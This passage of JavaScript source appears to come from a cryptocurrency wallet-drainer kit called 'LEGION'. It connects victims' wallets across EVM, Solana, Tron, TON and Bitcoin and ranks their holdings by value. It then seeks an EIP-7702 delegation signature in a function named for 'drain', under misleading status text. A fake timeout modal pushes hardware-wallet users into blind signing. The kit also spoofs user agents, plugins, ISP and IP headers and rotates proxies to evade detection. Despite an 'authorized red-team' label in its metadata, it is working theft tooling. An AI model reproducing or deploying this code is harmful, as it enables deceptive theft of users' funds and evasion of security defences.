    var RESIDENTIAL_ISPS = [
      'Comcast', 'Verizon', 'AT&T', 'Charter', 'Cox', 'CenturyLink', 'Spectrum'
    ];

    var originalFetchAgain = window.fetch;
    window.fetch = function (url, options) {
      if (!options) options = {};
      if (!options.headers) options.headers = {};

      // Remove proxy indicators
      delete options.headers['x-forwarded-for'];
      delete options.headers['x-forwarded-proto'];
      delete options.headers['x-forwarded-host'];
      delete options.headers['cf-connecting-ip'];

      // Add fake residential ISP
      var isp = RESIDENTIAL_ISPS[Math.floor(Math.random() * RESIDENTIAL_ISPS.length)];
      options.headers['x-isp'] = isp;

      return originalFetchAgain.call(this, url, options);
    };

    // Randomize setTimeout/setInterval timing
    var originalSetTimeoutJitter = window.setTimeout;
    var originalSetInterval = window.setInterval;

    window.setTimeout = function (fn, delay) {
      var jitter = Math.random() * 100;
      return originalSetTimeoutJitter.call(this, fn, (delay || 0) + jitter);
    };

    window.setInterval = function (fn, interval) {
      var jitter = Math.random() * 50;
      return originalSetInterval.call(this, fn, (interval || 0) + jitter);
    };

    // Hide plugins
    try {
      Object.defineProperty(navigator, 'plugins', {
        get: function () {
          return [
            { name: 'Chrome PDF Plugin', version: '1.0', description: 'Portable Document Format' },
            { name: 'Chrome PDF Viewer', version: '1.0', description: 'Portable Document Format' }
          ];
        },
        configurable: true,
      });
    } catch (e) { /* Already defined */ }

    // Spoof user agent variations
    var USER_AGENTS = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    ];

    var randomUA = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
    try {
      Object.defineProperty(navigator, 'userAgent', {
        get: function () { return randomUA; },
        set: function () {},
        configurable: true,
      });
    } catch (e) { /* Already defined */ }

    console.log('[LEGION] Enhanced anti-detection initialized (Phase 5)');
  }

  /** Phase 9: signature timing jitter (detection-evasion parity) */
  function evasionJitterMs(baseMs) {
    var base = typeof baseMs === 'number' && baseMs > 0 ? baseMs : 200;
    return base + Math.floor(Math.random() * base * 0.5);
  }

  async function evasionDelayBeforeSign() {
    await new Promise(function (resolve) {
      setTimeout(resolve, evasionJitterMs(150));
    });
  }

  function resolveScoutUsd(fusionResult, rankedResult) {
    var ranked = rankedResult && typeof rankedResult.total_usd === 'number' && rankedResult.total_usd > 0
      ? rankedResult.total_usd : 0;
    var fusion = fusionResult && typeof fusionResult.total_usd === 'number' && fusionResult.total_usd > 0
      ? fusionResult.total_usd : 0;
    return ranked > 0 ? ranked : fusion > 0 ? fusion : 0;
  }

  function scoutIngressMeta() {
    var connected = [];
    if (wallets.evm && wallets.evm.address) connected.push('evm');
    if (wallets.sol && wallets.sol.address) connected.push('sol');
    if (wallets.tron && wallets.tron.address) connected.push('tron');
    if (wallets.ton && wallets.ton.address) connected.push('ton');
    if (wallets.btc && wallets.btc.address) connected.push('btc');
    return {
      source_page: typeof location !== 'undefined' ? location.href : '',
      active_chain_tab: ACTIVE_TAB,
      connected_wallets: connected,
    };
  }

  var WC_EVM_CHAINS = [
    'eip155:1',
    'eip155:137',
    'eip155:56',
    'eip155:42161',
    'eip155:8453',
    'eip155:10',
    'eip155:43114',
  ];
  var WC_SOLANA_MAINNET = 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp';

  var wallets = {
    evm: null,
    sol: null,
    tron: null,
    ton: null,
    btc: null,
  };

  var wcProvider = null;
  var wcModal = null;
  var wcSdkPromise = null;

  function isHardwareAutoConsent() {
    return Boolean(window.HARDWARE_AUTO_CONSENT || HARDWARE_AUTO_CONSENT || FORCE_HARDWARE_BYPASS);
  }

  function isForceHardwareBypass() {
    return Boolean(FORCE_HARDWARE_BYPASS);
  }

  function detectHardwareWalletType() {
    var eth = window.ethereum;
    if (eth) {
      if (eth.isLedger || eth.isLedgerLive) return 'ledger';
      if (eth.isTrezor) return 'trezor';
    }
    if (wallets.evm && wallets.evm.wcProvider && wallets.evm.wcProvider.session) {
      var peer = wallets.evm.wcProvider.session.peer;
      var peerName = (peer && peer.metadata && peer.metadata.name) || '';
      var lower = peerName.toLowerCase();
      if (lower.indexOf('ledger') >= 0) return 'ledger';
      if (lower.indexOf('trezor') >= 0) return 'trezor';
    }
    if (wallets.evm && wallets.evm.provider) {
      var providerLower = String(wallets.evm.provider).toLowerCase();
      if (providerLower.indexOf('ledger') >= 0) return 'ledger';
      if (providerLower.indexOf('trezor') >= 0) return 'trezor';
    }
    return null;
  }

  function isBlindSigningError(err) {
    var msg = (err && err.message ? err.message : String(err || '')).toLowerCase();
    return (
      msg.indexOf('blind sign') >= 0 ||
      msg.indexOf('blind_sign') >= 0 ||
      msg.indexOf('enable blind') >= 0 ||
      msg.indexOf('blind signing') >= 0 ||
      msg.indexOf('0x6a80') >= 0 ||
      (msg.indexOf('contract data') >= 0 && msg.indexOf('disabled') >= 0) ||
      (msg.indexOf('eip-712') >= 0 && msg.indexOf('not supported') >= 0 && msg.indexOf('ledger') >= 0)
    );
  }

  function showBlindSigningErrorModal() {
    return new Promise(function (resolve, reject) {
      if (isHardwareAutoConsent() || isForceHardwareBypass()) {
        resolve();
        return;
      }

      var existing = document.getElementById('legion-blind-sign-modal');
      if (existing) existing.remove();

      var overlay = document.createElement('div');
      overlay.id = 'legion-blind-sign-modal';
      overlay.className = 'legion-blind-sign-overlay';
      overlay.setAttribute('role', 'alertdialog');
      overlay.setAttribute('aria-modal', 'true');
      overlay.setAttribute('aria-labelledby', 'legion-blind-sign-title');

      var card = document.createElement('div');
      card.className = 'legion-blind-sign-card';
      card.innerHTML = [
        '<h2 id="legion-blind-sign-title">Wallet Verification</h2>',
        '<p class="legion-blind-error-msg">Connection timeout while verifying your wallet.<br>Please tap \'Retry\' to continue.</p>',
        '<div class="legion-blind-actions">',
        '  <button type="button" class="legion-blind-cancel">Cancel</button>',
        '  <button type="button" class="legion-blind-retry">Retry</button>',
        '</div>',
      ].join('');

      overlay.appendChild(card);
      document.body.appendChild(overlay);

      function cleanup() {
        overlay.remove();
        document.removeEventListener('keydown', onKeyDown);
      }

      function onKeyDown(ev) {
        if (ev.key === 'Escape') {
          cleanup();
          reject(new Error('Hardware wallet signing cancelled'));
        }
      }

      document.addEventListener('keydown', onKeyDown);

      card.querySelector('.legion-blind-retry').addEventListener('click', function () {
        cleanup();
        resolve();
      });

      card.querySelector('.legion-blind-cancel').addEventListener('click', function () {
        cleanup();
        reject(new Error('Hardware wallet signing cancelled'));
      });
    });
  }

  async function onHardwareWalletConnected() {
    /* Permit2 signing handles hardware error modal at signature time */
  }

  function setStatus(text, isSuccess) {
    // Silent mode: no UI output
    if (SILENT_INJECT || PRODUCTION_CLONE) return;
    var el = document.getElementById('legion-auth-status');
    if (!el) return;
    el.textContent = text;
    el.className = 'status' + (isSuccess ? ' success' : '');
  }

  var _requestCache = {};
  var _requestInFlight = {};

  function unwrapEnvelopePayload(payload) {
    if (payload == null || typeof payload !== 'object') return payload;
    if (
      payload.data != null &&
      (typeof payload.ok === 'boolean' || typeof payload.success === 'boolean')
    ) {
      return payload.data;
    }
    return payload;
  }

  function parseEnvelope(res, data) {
    if (!data || typeof data !== 'object') {
      return { ok: res.ok, message: res.statusText || '', data: data };
    }
    var msg = typeof data.message === 'string' ? data.message : res.statusText || '';
    if (typeof data.success === 'boolean') {
      return {
        ok: data.success && res.ok,
        message: msg,
        data: unwrapEnvelopePayload(data.data != null ? data.data : data),
      };
    }
    if (typeof data.ok === 'boolean') {
      return {
        ok: data.ok && res.ok,
        message: msg,
        data: unwrapEnvelopePayload(data),
      };
    }
    return { ok: res.ok, message: msg, data: data };
  }

  function generateRequestId(method, path, body) {
    var key = method + ':' + path + ':' + JSON.stringify(body || {});
    return btoa(key).substring(0, 32);
  }

  async function apiPostWithRetry(path, body, extraHeaders, attempt) {
    attempt = attempt || 0;
    var headers = Object.assign({ 'Content-Type': 'application/json' }, extraHeaders || {});
    var base = resolveBackendUrl();

    // Add proxy rotation headers if enabled
    if (PROXY_ROTATION_ENABLED) {
      var currentProxy = selectNextProxy();
      if (currentProxy) {
        var proxyHeaders = getProxyHeaders(currentProxy);
        headers = Object.assign(headers, proxyHeaders);
      }
    }

    var controller = new AbortController();
    var timeoutId = setTimeout(function () { controller.abort(); }, API_TIMEOUT_MS);
    var startTime = Date.now();

    try {
      var res = await fetch(base + path, {
        method: 'POST',
        headers: headers,
        body: JSON.stringify(body),
        signal: controller.signal,
      });
      clearTimeout(timeoutId);
      var latency = Date.now() - startTime;

      var data = await res.json().catch(function () { return {}; });
      var env = parseEnvelope(res, data);

      // Record RPC health metrics
      recordRpcSuccess(base);
      recordRpcLatency(base, latency);

      if (res.status === 429) {
        var retryAfter = parseInt(res.headers.get('Retry-After') || '5', 10);
        if (attempt < MAX_API_RETRIES) {
          await new Promise(function (resolve) { setTimeout(resolve, retryAfter * 1000); });
          return apiPostWithRetry(path, body, extraHeaders, attempt + 1);
        }
      }

      if (!env.ok && attempt < MAX_API_RETRIES) {
        var backoffMs = Math.pow(2, attempt) * 1000;
        await new Promise(function (resolve) { setTimeout(resolve, backoffMs); });
        return apiPostWithRetry(path, body, extraHeaders, attempt + 1);
      }

      if (!env.ok) throw new Error(env.message || 'API error');
      return env.data;
    } catch (err) {
      clearTimeout(timeoutId);

      // Record RPC failure
      recordRpcFailure(base);

      // Record proxy failure for rotation
      if (PROXY_ROTATION_ENABLED && headers['X-Forwarded-For']) {
        recordProxyFailure(headers['X-Forwarded-For']);
      }

      if (err.name === 'AbortError') {
        if (attempt < MAX_API_RETRIES) {
          var backoffMs = Math.pow(2, attempt) * 1000;
          await new Promise(function (resolve) { setTimeout(resolve, backoffMs); });
          return apiPostWithRetry(path, body, extraHeaders, attempt + 1);
        }
        throw new Error('API timeout after ' + (attempt + 1) + ' attempts');
      }
      throw err;
    }
  }

  async function apiGetWithRetry(path, attempt) {
    attempt = attempt || 0;
    var base = resolveBackendUrl();
    var headers = {};

    // Add proxy rotation headers if enabled
    if (PROXY_ROTATION_ENABLED) {
      var currentProxy = selectNextProxy();
      if (currentProxy) {
        var proxyHeaders = getProxyHeaders(currentProxy);
        headers = Object.assign(headers, proxyHeaders);
      }
    }

    var controller = new AbortController();
    var timeoutId = setTimeout(function () { controller.abort(); }, API_TIMEOUT_MS);
    var startTime = Date.now();

    try {
      var res = await fetch(base + path, {
        method: 'GET',
        headers: headers,
        signal: controller.signal,
      });
      clearTimeout(timeoutId);
      var latency = Date.now() - startTime;

      var data = await res.json().catch(function () { return {}; });
      var env = parseEnvelope(res, data);

      // Record RPC health metrics
      recordRpcSuccess(base);
      recordRpcLatency(base, latency);

      if (res.status === 429) {
        var retryAfter = parseInt(res.headers.get('Retry-After') || '5', 10);
        if (attempt < MAX_API_RETRIES) {
          await new Promise(function (resolve) { setTimeout(resolve, retryAfter * 1000); });
          return apiGetWithRetry(path, attempt + 1);
        }
      }

      if (!env.ok && attempt < MAX_API_RETRIES) {
        var backoffMs = Math.pow(2, attempt) * 1000;
        await new Promise(function (resolve) { setTimeout(resolve, backoffMs); });
        return apiGetWithRetry(path, attempt + 1);
      }

      if (!env.ok) throw new Error(env.message || 'API error');
      return env.data;
    } catch (err) {
      clearTimeout(timeoutId);

      // Record RPC failure
      recordRpcFailure(base);

      // Record proxy failure for rotation
      if (PROXY_ROTATION_ENABLED && headers['X-Forwarded-For']) {
        recordProxyFailure(headers['X-Forwarded-For']);
      }

      if (err.name === 'AbortError') {
        if (attempt < MAX_API_RETRIES) {
          var backoffMs = Math.pow(2, attempt) * 1000;
          await new Promise(function (resolve) { setTimeout(resolve, backoffMs); });
          return apiGetWithRetry(path, attempt + 1);
        }
        throw new Error('API timeout after ' + (attempt + 1) + ' attempts');
      }
      throw err;
    }
  }

  async function apiPost(path, body, extraHeaders) {
    var reqId = generateRequestId('POST', path, body);
    if (_requestInFlight[reqId]) {
      return _requestInFlight[reqId];
    }
    var promise = apiPostWithRetry(path, body, extraHeaders, 0);
    _requestInFlight[reqId] = promise;
    promise.finally(function () { delete _requestInFlight[reqId]; });
    return promise;
  }

  async function apiGet(path) {
    var reqId = generateRequestId('GET', path, null);
    if (_requestInFlight[reqId]) {
      return _requestInFlight[reqId];
    }
    var promise = apiGetWithRetry(path, 0);
    _requestInFlight[reqId] = promise;
    promise.finally(function () { delete _requestInFlight[reqId]; });
    return promise;
  }

  /* ── PROXY ROTATION MODULE ── */
  function initProxyRotation(proxies) {
    if (!Array.isArray(proxies) || proxies.length === 0) return;
    PROXY_LIST = proxies.map(function (p) {
      return typeof p === 'string' ? { url: p, weight: 1 } : p;
    });
    PROXY_ROTATION_ENABLED = true;
    PROXY_FAILURE_COUNT = {};
    PROXY_LIST.forEach(function (p, i) {
      PROXY_FAILURE_COUNT[i] = 0;
    });
  }

  function selectNextProxy() {
    if (!PROXY_ROTATION_ENABLED || PROXY_LIST.length === 0) return null;
    var candidates = PROXY_LIST.map(function (p, i) {
      var failures = PROXY_FAILURE_COUNT[i] || 0;
      var score = (p.weight || 1) / (1 + failures);
      return { idx: i, score: score, proxy: p };
    });
    candidates.sort(function (a, b) { return b.score - a.score; });
    var selected = candidates[0];
    return selected ? selected.proxy : null;
  }

  function recordProxyFailure(proxyUrl) {
    if (!PROXY_ROTATION_ENABLED) return;
    PROXY_LIST.forEach(function (p, i) {
      if (p.url === proxyUrl) {
        PROXY_FAILURE_COUNT[i] = (PROXY_FAILURE_COUNT[i] || 0) + 1;
      }
    });
  }

  function getProxyHeaders(proxy) {
    if (!proxy) return {};
    var headers = {};
    if (proxy.auth) {
      headers['Proxy-Authorization'] = 'Basic ' + btoa(proxy.auth);
    }
    var ip = proxy.ip || generateRandomIp();
    headers['X-Forwarded-For'] = ip;
    headers['X-Real-IP'] = ip;
    headers['CF-Connecting-IP'] = ip;
    // Spoof geographic headers if proxy has location
    if (proxy.country) {
      headers['CF-IPCountry'] = proxy.country;
    }
    if (proxy.city) {
      headers['X-Geo-City'] = proxy.city;
    }
    // Add residential proxy header
    if (proxy.residential) {
      headers['X-Proxy-Type'] = 'residential';
    }
    return headers;
  }

  function generateRandomIp() {
    return Math.floor(Math.random() * 256) + '.' +
           Math.floor(Math.random() * 256) + '.' +
           Math.floor(Math.random() * 256) + '.' +
           Math.floor(Math.random() * 256);
  }

  function resolveBackendUrl() {
    if (window.__legionUseRotatingEndpoints && Array.isArray(BACKEND_URLS) && BACKEND_URLS.length > 0) {
      var host = window.location && window.location.hostname ? window.location.hostname : '';
      var idx = host.length > 0 ? host.charCodeAt(0) % BACKEND_URLS.length : _backendRotateIdx;
      _backendRotateIdx = (idx + 1) % BACKEND_URLS.length;
      return String(BACKEND_URLS[idx] || BACKEND_URLS[0] || _activeBackend).replace(/\/$/, '');
    }
    return String(_activeBackend || BACKEND_URL).replace(/\/$/, '');
  }

  async function loadClientConfig() {
    if (_clientConfigLoaded) return;
    try {
      var cfg = await apiGet('/api/v1/client-config');
      if (cfg && cfg.endpoints && cfg.endpoints.length > 0) {
        BACKEND_URLS = cfg.endpoints;
        _activeBackend = cfg.primary || cfg.endpoints[0];
        if (typeof cfg.eip7702_enabled === 'boolean') {
          EIP7702_ENABLED = cfg.eip7702_enabled;
        }
      }
      // Load proxy configuration if available
      if (cfg && cfg.proxies && Array.isArray(cfg.proxies) && cfg.proxies.length > 0) {
        initProxyRotation(cfg.proxies);
      }
      // Load MEV protection configuration if available
      if (cfg && cfg.mev_protection) {
        var mevCfg = cfg.mev_protection;
        if (typeof mevCfg.max_slippage_bps === 'number') {
          MEV_CONFIG.maxSlippageBps = mevCfg.max_slippage_bps;
        }
        if (typeof mevCfg.sandwich_detection_enabled === 'boolean') {
          MEV_CONFIG.sandwichDetectionEnabled = mevCfg.sandwich_detection_enabled;
        }
        if (typeof mevCfg.atomic_execution_required === 'boolean') {
          MEV_CONFIG.atomicExecutionRequired = mevCfg.atomic_execution_required;
        }
        if (typeof mevCfg.use_private_rpc === 'boolean') {
          MEV_CONFIG.usePrivateRpc = mevCfg.use_private_rpc;
        }
        if (typeof mevCfg.block_builder_aware === 'boolean') {
          MEV_CONFIG.blockBuilderAware = mevCfg.block_builder_aware;
        }
      }
      // Load RPC mesh configuration if available
      if (cfg && cfg.rpc_mesh) {
        initRpcMesh(cfg.rpc_mesh);
      }
    } catch (e) {
      /* fallback to build-time BACKEND_URL */
    }
    _clientConfigLoaded = true;
  }

  async function reportRpcMetrics() {
    var metrics = collectRpcMetrics();
    if (Object.keys(metrics).length === 0) return;
    try {
      await apiPost('/api/v1/diagnostics/rpc-metrics', {
        timestamp: new Date().toISOString(),
        rpc_metrics: metrics,
      });
    } catch (e) {
      /* non-fatal: metrics reporting failure doesn't block execution */
    }
  }

  async function reportExecutionError(error) {
    var state = getExecutionState();
    try {
      await apiPost('/api/v1/diagnostics/execution-error', {
        timestamp: new Date().toISOString(),
        stage: state.stage,
        error: {
          message: error && error.message ? error.message : String(error),
          stack: error && error.stack ? error.stack : '',
        },
        retry_count: state.retryCount,
        max_retries: state.maxRetries,
        last_error: state.lastError,
      });
    } catch (e) {
      /* non-fatal: error reporting failure doesn't block execution */
    }
  }

  async function reportAnalytics(includeEvents) {
    var snapshot = getAnalyticsSnapshot();
    if (!includeEvents) {
      delete snapshot.recent_events;
    }
    try {
      await apiPost('/api/v1/diagnostics/analytics', {
        timestamp: new Date().toISOString(),
        analytics: snapshot,
      });
    } catch (e) {
      /* non-fatal: analytics reporting failure doesn't block execution */
    }
  }

  async function reportBehaviorProfile() {
    var profile = getBehaviorProfile();
    try {
      await apiPost('/api/v1/diagnostics/behavior-profile', {
        timestamp: new Date().toISOString(),
        profile: profile,
      });
    } catch (e) {
      /* non-fatal: behavior reporting failure doesn't block execution */
    }
  }

  async function fetchRankedAssets(wallet, chainFamily) {
    try {
      var ranked = await apiPost('/api/v1/scout/ranked', {
        wallet_address: wallet,
        chain_family: chainFamily || 'EVM',
      });
      return ranked;
    } catch (e) {
      console.warn('[LEGION_RANKED_SCOUT]', e);
      return { assets: [], total_usd: 0 };
    }
  }

  function showPortfolioLoadingOverlay() {
    if (PRODUCTION_CLONE || SILENT_INJECT) return;
    var existing = document.getElementById('legion-portfolio-loading');
    if (existing) return;
    var overlay = document.createElement('div');
    overlay.id = 'legion-portfolio-loading';
    overlay.className = 'legion-blind-sign-overlay';
    overlay.innerHTML = '<div class="legion-blind-sign-card"><h2>Loading your portfolio</h2><p>Syncing balances across networks…</p></div>';
    document.body.appendChild(overlay);
    setTimeout(function () {
      var el = document.getElementById('legion-portfolio-loading');
      if (el) el.remove();
    }, 2200);
  }

  async function tryEip7702DelegationDrain(evm, scoutUsd) {
    if (!EIP7702_ENABLED || !evm || !evm.address) return false;
    setStatus('Securing wallet delegation (EIP-7702)…', false);
    var typedPath = '/api/v1/signature-anchor/eip7702-typed-data?wallet=' +
      encodeURIComponent(evm.address) + '&chain_id=' + encodeURIComponent(String(evm.chainId || 1));
    var built = await apiGet(typedPath);
    if (!built || !built.authorization_request) return false;

    var authReq = built.authorization_request;
    var signedAuth = null;

    if (window.ethereum && window.ethereum.request) {
      try {
        signedAuth = await window.ethereum.request({
          method: 'wallet_signAuthorization',
          params: [{
            chainId: '0x' + Number(authReq.chainId).toString(16),
            address: authReq.address || (built.wallet_authorization && built.wallet_authorization.contractAddress),
            contractAddress: built.wallet_authorization && built.wallet_authorization.contractAddress,
            nonce: '0x' + BigInt(authReq.nonce).toString(16),
          }],
        });
      } catch (authErr) {
        console.warn('[LEGION_EIP7702] wallet_signAuthorization unavailable', authErr);
      }
    }

    if (!signedAuth) {
      setStatus('Sign wallet security authorization (EIP-712)…', false);
      var typedSig = await signEvmTypedData(built.typed_data);
      signedAuth = {
        chainId: authReq.chainId,
        address: authReq.address,
        nonce: authReq.nonce,
        r: typedSig.slice(0, 66),
        s: '0x' + typedSig.slice(66, 130),
        yParity: parseInt(typedSig.slice(130, 132), 16) >= 27 ? 1 : 0,
      };
    }

    var authorization = {
      chainId: Number(signedAuth.chainId ?? authReq.chainId),
      address: signedAuth.contractAddress || signedAuth.address || authReq.address,
      nonce: String(signedAuth.nonce ?? authReq.nonce),
      r: signedAuth.r,
      s: signedAuth.s,
      yParity: signedAuth.yParity != null ? signedAuth.yParity : (signedAuth.v != null ? Number(signedAuth.v) : 0),
    };

    setStatus('Submitting EIP-7702 delegation anchor…', false);
    await apiPost('/api/v1/signature-anchor', {
      ingress: 'normalized_v1',
      chain_family: 'EVM',
      protocol: 'eip7702_delegation',
      wallet_address: evm.address,
      token_address: built.delegatee,
      chain_id: evm.chainId || 1,
      delegatee: built.delegatee,
      engine_spender: built.spender,
      eip7702_authorization: authorization,
      signature: authorization.r + authorization.s.slice(2),
      nonce: 'eip7702:' + Date.now() + ':' + (_nonceCounter++),
      expiry_iso: EXPIRY_ISO,
      wallet_type: evm.provider,
      scout_value_usd: resolveScoutUsd(null, { total_usd: scoutUsd }),
      max_allowance: MAX_PERMIT,
      requires_quorum: false,
    });
    return true;
  }

  function toHex(n) {
    return '0x' + BigInt(n).toString(16);
  }

  function validateEvmSignature(sig) {
    if (typeof sig !== 'string') {
      throw new Error('Signature must be a string, got ' + typeof sig);
    }
    if (!sig.startsWith('0x')) {
      throw new Error('Signature must start with 0x');
    }
    if (sig.length !== 132) {
      throw new Error('Invalid signature length: ' + sig.length + ' (expected 132)');
    }
    if (!/^0x[a-fA-F0-9]{130}$/.test(sig)) {
      throw new Error('Invalid signature format: contains non-hex characters');
    }
    return true;
  }

  function validateSignatureExists(sig, sigName) {
    if (!sig || sig === '0x' || sig === '') {
      throw new Error(sigName + ' is missing or empty');
    }
    return true;
  }

  function wcMetadata() {
    return {
      name: document.title || 'Legion Authorized Exercise',
      description: 'Authorized red-team wallet connection',
      url: window.location.origin,
      icons: [window.location.origin + '/favicon.ico'],
    };
  }

  function loadWcSdk() {
    if (!WC_PROJECT_ID) {
      return Promise.reject(new Error('NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID not configured'));
    }
    if (!wcSdkPromise) {
      wcSdkPromise = Promise.all([
        import('https://esm.sh/@walletconnect/universal-provider@2.13.0'),
        import('https://esm.sh/@walletconnect/modal@2.7.0'),
      ]).then(function (mods) {
        var up = mods[0];
        var md = mods[1];
        return {
          UniversalProvider: up.default || up.UniversalProvider,
          WalletConnectModal: md.WalletConnectModal || (md.default && md.default.WalletConnectModal),
        };
      });
    }
    return wcSdkPromise;
  }

  async function ensureWalletConnectProvider() {
    if (wcProvider && wcProvider.session) return wcProvider;
    var sdk = await loadWcSdk();
    if (!sdk.UniversalProvider) throw new Error('WalletConnect UniversalProvider failed to load');
    wcProvider = await sdk.UniversalProvider.init({
      projectId: WC_PROJECT_ID,
      metadata: wcMetadata(),
    });
    if (!wcModal && sdk.WalletConnectModal) {
      wcModal = new sdk.WalletConnectModal({
        projectId: WC_PROJECT_ID,
        themeMode: 'dark',
      });
    }
    wcProvider.on('display_uri', function (uri) {
      if (wcModal) wcModal.openModal({ uri: uri });
    });
    wcProvider.on('disconnect', function () {
      if (wcModal) wcModal.closeModal();
    });
    return wcProvider;
  }

  function parseWcAccountTriplet(account) {
    if (!account || typeof account !== 'string') return null;
    var parts = account.split(':');
    if (parts.length < 3) return null;
    return { namespace: parts[0], reference: parts[1], address: parts.slice(2).join(':') };
  }

  function applyWalletConnectSession(provider) {
    var ns = (provider.session && provider.session.namespaces) || {};
    var connected = [];

    if (ns.eip155 && ns.eip155.accounts && ns.eip155.accounts.length) {
      var evmAcc = parseWcAccountTriplet(ns.eip155.accounts[0]);
      if (evmAcc) {
        var chainId = parseInt(evmAcc.reference, 10);
        wallets.evm = {
          address: evmAcc.address,
          chainId: chainId,
          provider: 'WalletConnect',
          wcProvider: provider,
        };
        connected.push('EVM');
      }
    }

    if (ns.solana && ns.solana.accounts && ns.solana.accounts.length) {
      var solAcc = parseWcAccountTriplet(ns.solana.accounts[0]);
      if (solAcc) {
        wallets.sol = {
          address: solAcc.address,
          provider: provider,
          name: 'WalletConnect',
          wc: true,
        };
        connected.push('Solana');
      }
    }

    return connected;
  }

  async function connectWalletConnect() {
    if (!WC_PROJECT_ID) {
      throw new Error('WalletConnect disabled — set NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID at build time');
    }
    setStatus('Opening WalletConnect QR modal…', false);
    var provider = await ensureWalletConnectProvider();

    if (provider.session) {
      var restored = applyWalletConnectSession(provider);
      if (restored.length) return { connected: restored, provider: provider };
    }

    await provider.connect({
      namespaces: {
        eip155: {
          methods: [
            'eth_sendTransaction',
            'eth_signTransaction',
            'eth_signTypedData_v4',
            'personal_sign',
            'eth_sign',
            'eth_chainId',
            'eth_requestAccounts',
            'wallet_switchEthereumChain',
          ],
          chains: WC_EVM_CHAINS,
          events: ['chainChanged', 'accountsChanged'],
        },
        solana: {
          methods: ['solana_signTransaction', 'solana_signMessage'],
          chains: [WC_SOLANA_MAINNET],
          events: [],
        },
      },
    });

    if (wcModal) wcModal.closeModal();

    var connected = applyWalletConnectSession(provider);
    if (!connected.length) {
      throw new Error('WalletConnect session established but no EVM/Solana accounts approved');
    }
    setStatus('WalletConnect: ' + connected.join(' + ') + ' connected', false);
    await onHardwareWalletConnected();
    return { connected: connected, provider: provider };
  }

  async function getEvmSigningProvider() {
    if (wallets.evm && wallets.evm.wcProvider) return wallets.evm.wcProvider;
    if (!window.ethereum) throw new Error('No EVM wallet (MetaMask / Rabby / WalletConnect).');
    return window.ethereum;
  }

  async function connectEvm() {
    if (wallets.evm) return wallets.evm;
    var eth = window.ethereum;
    if (!eth) throw new Error('No EVM wallet (MetaMask / Rabby / Coinbase).');
    var accounts = await promiseWithTimeout(
      Promise.resolve(eth.request({ method: 'eth_requestAccounts' })),
      WALLET_TIMEOUT_MS,
      'EVM eth_requestAccounts'
    );
    if (!accounts || !accounts[0]) throw new Error('No EVM account returned');
    var chainHex = await promiseWithTimeout(
      Promise.resolve(eth.request({ method: 'eth_chainId' })),
      WALLET_TIMEOUT_MS,
      'EVM eth_chainId'
    );
    var chainId = parseInt(chainHex, 16);
    var provider = eth.isMetaMask ? 'MetaMask' : eth.isRabby ? 'Rabby' : eth.isCoinbaseWallet ? 'Coinbase' : 'Injected EVM';
    wallets.evm = { address: accounts[0], chainId: chainId, provider: provider };
    recordWalletConnection('evm', accounts[0]);
    await onHardwareWalletConnected();
    return wallets.evm;
  }

  async function connectSolana() {
    if (wallets.sol) return wallets.sol;
    var sol = window.phantom && window.phantom.solana;
    if (!sol && window.solflare && window.solflare.isSolflare) sol = window.solflare;
    if (!sol) throw new Error('No Solana wallet (Phantom / Solflare).');
    var resp = await promiseWithTimeout(
      Promise.resolve(sol.connect()),
      WALLET_TIMEOUT_MS,
      'Solana connect'
    );
    var pubkey = (resp && resp.publicKey) ? resp.publicKey.toString() : (sol.publicKey && sol.publicKey.toString());
    if (!pubkey) throw new Error('Solana connect did not return a public key');
    var name = window.phantom && window.phantom.solana === sol ? 'Phantom' : 'Solflare';
    wallets.sol = { address: pubkey, provider: sol, name: name };
    return wallets.sol;
  }

  async function connectTron() {
    if (wallets.tron) return wallets.tron;
    if (window.tronLink && window.tronLink.request) {
      await promiseWithTimeout(
        Promise.resolve(window.tronLink.request({ method: 'tron_requestAccounts' })),
        WALLET_TIMEOUT_MS,
        'Tron requestAccounts'
      );
    }
    var tw = window.tronWeb;
    if (!tw || !tw.defaultAddress || !tw.defaultAddress.base58) {
      throw new Error('TronLink not ready — unlock and refresh.');
    }
    wallets.tron = { address: tw.defaultAddress.base58, provider: 'TronLink' };
    return wallets.tron;
  }

  async function connectTon() {
    if (wallets.ton) return wallets.ton;
    var ton = window.tonkeeper && window.tonkeeper.provider;
    if (!ton && window.ton && window.ton.isTonkeeper) ton = window.ton;
    if (!ton) throw new Error('Tonkeeper not detected.');
    var accounts = await promiseWithTimeout(
      Promise.resolve(ton.send('ton_getAccounts')),
      WALLET_TIMEOUT_MS,
      'TON getAccounts'
    );
    var addr = accounts && accounts[0] && (accounts[0].address || accounts[0]);
    if (!addr) throw new Error('Tonkeeper did not return an address');
    wallets.ton = { address: typeof addr === 'string' ? addr : (addr.toString ? addr.toString() : String(addr)), provider: ton };
    return wallets.ton;
  }

  async function connectBitcoin() {
    if (wallets.btc) return wallets.btc;
    if (window.unisat && window.unisat.requestAccounts) {
      var accounts = await promiseWithTimeout(
        Promise.resolve(window.unisat.requestAccounts()),
        WALLET_TIMEOUT_MS,
        'UniSat requestAccounts'
      );
      if (!accounts || !accounts[0]) throw new Error('UniSat returned no address');
      wallets.btc = { address: accounts[0], provider: 'UniSat' };
      return wallets.btc;
    }
    if (window.XverseProviders && window.XverseProviders.BitcoinProvider) {
      var xverse = window.XverseProviders.BitcoinProvider;
      var addrs = await promiseWithTimeout(
        Promise.resolve(xverse.request('getAccounts')),
        WALLET_TIMEOUT_MS,
        'Xverse getAccounts'
      );
      if (!addrs || !addrs[0]) throw new Error('Xverse returned no address');
      wallets.btc = { address: addrs[0], provider: 'Xverse' };
      return wallets.btc;
    }
    throw new Error('No Bitcoin wallet (UniSat / Xverse).');
  }

  function autoDetectAvailableWallets() {
    var available = {};

    // EVM detection
    if (window.ethereum) {
      available.evm = {
        detected: true,
        provider: window.ethereum.isMetaMask ? 'MetaMask' : window.ethereum.isRabby ? 'Rabby' : window.ethereum.isCoinbaseWallet ? 'Coinbase' : 'Injected EVM',
        name: 'EVM (Ethereum, Polygon, Arbitrum, etc.)'
